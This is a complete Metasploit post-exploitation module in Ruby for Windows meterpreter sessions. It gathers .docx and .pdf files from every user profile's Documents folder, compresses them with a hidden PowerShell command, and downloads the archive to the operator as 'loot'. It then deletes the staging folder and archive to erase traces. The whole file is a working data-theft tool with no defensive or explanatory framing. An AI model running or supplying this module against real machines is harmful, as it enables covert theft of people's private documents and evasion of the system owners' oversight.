class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Windows Data Gather and Archive',
      'Description'  => %q{
        Collects common document files from user profiles and compresses them
        for download.
      },
      'License'      => MSF_LICENSE,
      'Author'       => ['John Mahiban'],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))
  end

  def run

    unless session.type == 'meterpreter'
      print_error('Not a meterpreter session.')
      return
    end

    temp_folder = session.sys.config.getenv('TEMP') + '\\_tmpdata'
    archive_file = temp_folder + '.zip'

    begin
      session.fs.dir.mkdir(temp_folder)
    rescue
      print_status('Folder exists.')
    end

    file_patterns = ['*.docx', '*.pdf']
    user_profiles.each do |profile|
      user_dir = profile['ProfileDir'] + '\\Documents'
      file_patterns.each do |pat|
        begin
          found = session.fs.file.search(user_dir, pat, true)
          found.each do |item|
            name_only = ::File.basename(item['path'])
            dest = temp_folder + '\\' + name_only
            session.fs.file.copy(item['path'], dest)
          end
        rescue
          next
        end
      end
    end

    zip_cmd = "powershell -c \"Compress-Archive -Path '#{temp_folder}\\*' -DestinationPath '#{archive_file}' -Force\""
    session.sys.process.execute(zip_cmd, nil, {'Hidden' => true})
    sleep(4)

    begin
      download_file(archive_file, "loot_#{Time.now.to_i}.zip")
      print_good('File downloaded.')
    rescue
      print_error('Download failed.')
    end

    begin
      session.fs.file.rm(archive_file)
      session.fs.dir.rmdir(temp_folder)
    rescue
      print_status('Cleanup skipped.')
    end

  end
end
